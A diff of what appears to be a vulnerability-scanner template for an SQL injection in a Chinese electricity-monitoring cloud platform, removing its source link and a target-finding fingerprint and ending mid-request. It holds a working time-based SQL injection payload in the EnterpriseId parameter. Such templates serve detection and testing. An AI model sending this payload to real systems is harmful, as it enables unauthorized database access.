@@ -3,12 +3,8 @@ info:
   name: 用电监管综合云平台GetEnterpriseInfoById存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qtyo4mkqkqny8vrg'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qtyo4mkqkqny8vrg
-    fofa: '"myCss/phone.css"'
 http:
 - raw:
   - 'GET /MainMonitor/GetEnterpriseInfoById?EnterpriseId=81434139%27%3BSELECT%20SLEEP%285%29%23 HTTP/1.1
